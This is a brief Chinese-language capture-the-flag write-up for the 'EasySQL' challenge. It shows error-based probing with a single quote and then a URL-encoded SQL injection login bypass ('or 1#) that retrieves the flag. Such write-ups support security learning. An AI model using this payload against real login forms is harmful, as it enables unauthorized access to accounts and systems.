# [极客大挑战 2019]EasySQL
访问url，是一个登录页面，使用Burp Suite抓包，修改账号密码

在用户名后添加单引号：`/check.php?username=123'&password=123`

发现报错：
```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '123'' at line 1
```

尝试构造弱口令：
`/check.php?username=123'or%201%23&password=123`

get flag!
